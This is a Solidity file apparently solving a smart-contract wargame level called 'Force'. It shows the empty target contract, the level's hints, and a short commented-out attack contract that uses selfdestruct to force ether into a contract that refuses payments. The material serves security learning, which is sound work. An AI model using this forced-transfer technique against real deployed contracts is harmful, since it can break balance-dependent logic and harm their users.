// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

/**
 * Some contracts will simply not take your money ¯\_(ツ)_/¯
 *
 * The goal of this level is to make the balance of the contract greater than zero.
 *
 *   Things that might help:
 *
 * Fallback methods
 * Sometimes the best way to attack a contract is with another contract.
 * See the "?" page above, section "Beyond the console"
 *
 * when you do selfdestruct(address) it will send all the balance to that address.
 */

// on remix :

// pragma solidity ^0.8.0;

// contract Attack {
//     constructor() payable {}

//     function forceBalanceGreaterThanZero(address _forceContractAddress) public {
//         selfdestruct(payable(_forceContractAddress));
//     }
// }
